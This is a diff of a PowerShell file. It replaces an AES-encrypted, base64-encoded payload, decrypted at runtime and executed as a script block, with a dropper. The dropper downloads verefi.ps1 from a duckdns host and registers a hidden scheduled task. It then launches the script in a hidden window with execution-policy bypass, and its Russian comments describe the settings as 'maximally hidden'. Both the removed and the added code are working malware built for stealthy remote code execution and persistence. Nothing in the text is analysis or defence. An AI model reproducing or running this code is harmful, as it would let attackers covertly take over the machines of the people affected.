@@ -1,1 +1,52 @@
-$k=[Convert]::FromBase64String('gQ6LzEQL6Jjsd9vPw1OJCbdxeJFrxtLHD+KE4hF733M=');$iv=[Convert]::FromBase64String('+tvbpNMRbmMQcE4kilvxtw==');$e=[Convert]::FromBase64String('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');$a=New-Object ("Secu"+"rity.Cryptography.Aes"+"Managed");$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$iv;$d=$a.CreateDecryptor();$rukp=$d.TransformFinalBlock($e,0,$e.Length);$tuez=[Text.Encoding]::UTF8.GetString($rukp);. ([ScriptBlock]::Create($tuez))
+$taskName = "VerefiTask"
+
+$tempDir = $env:TEMP
+$ps1FileName = "verefi.ps1"
+$downloadUrl = "http://verefy.duckdns.org/verefi.ps1"
+
+$ps1Path = Join-Path -Path $tempDir -ChildPath $ps1FileName
+$workDir  = $tempDir
+
+
+Invoke-WebRequest -Uri $downloadUrl -OutFile $ps1Path -UseBasicParsing -ErrorAction Stop
+
+try {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction Stop
+} catch {
+}
+$action = New-ScheduledTaskAction `
+    -Execute "powershell.exe" `
+    -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ps1Path`"" `
+    -WorkingDirectory $workDir
+
+$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddYears(10))
+
+# Настройки — максимально скрытые
+$settings = New-ScheduledTaskSettingsSet `
+    -Hidden `
+    -StartWhenAvailable `
+    -MultipleInstances IgnoreNew `
+    -AllowStartIfOnBatteries `
+    -DontStopIfGoingOnBatteries `
+    -ExecutionTimeLimit (New-TimeSpan -Minutes 0)
+
+# Регистрируем задачу
+Register-ScheduledTask `
+    -TaskName $taskName `
+    -Action $action `
+    -Trigger $trigger `
+    -Settings $settings `
+    -Description "Hidden background launch of verefi.ps1" `
+    -Force | Out-Null
+
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "powershell.exe"
+$psi.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ps1Path`""
+$psi.WorkingDirectory = $workDir
+$psi.UseShellExecute = $false
+$psi.CreateNoWindow = $true
+$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+
+$proc = New-Object System.Diagnostics.Process
+$proc.StartInfo = $psi
+$null = $proc.Start()
